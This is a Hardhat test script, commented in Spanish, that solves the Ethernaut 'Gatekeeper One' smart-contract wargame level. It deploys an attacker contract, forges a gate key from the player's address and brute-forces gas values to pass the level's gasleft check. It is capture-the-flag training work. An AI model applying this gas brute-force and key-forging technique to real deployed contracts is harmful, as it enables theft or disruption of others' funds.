import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
let originEnUint16;
const LEVEL_ADDRESS = "0x9b261b23cE149422DE75907C6ac0C30cEc4e652A";
const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`GatekeeperOne`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }
//   // Contrato prueba (Si fuera necesario)
//   const testChallengeFactory = await ethers.getContractFactory(`GatekeeperConsole`);
//   challenge = await testChallengeFactory.deploy();
//   await challenge.deployed();
//   console.log(`CONTRATO TESTER DEPLOYADO EN:`, challenge.address);

  // Contrato atacante (Si fuera necesario)
  const attackerFactory = await ethers.getContractFactory(`GateAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
  await attacker.deployed();
  console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Gatekeeper One Challenge", async()=> {
  it("Resuelve el challenge - Gatekeeper One", async()=>{
    let uint16address = (await eoa.getAddress()).slice(-4);
    let gatekey = `0x100000000000${uint16address}`
    console.log(`GATEKEY A PROBAR : ${gatekey}`);
    
    let cantidadGas= 800000; //Usar un número elevado, ya que cada gasleft() gasta bastante.
    let tx;

    for (let aumento = 0; aumento < 20000; aumento++) {
      console.log(`PROBANDO BYPASS A GATE 2 CON ${cantidadGas + aumento}`);
      try {
        tx = await attacker.atacar(gatekey, cantidadGas + aumento, {gasLimit:1e6});
        break;
      } catch {}
    }
  })
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});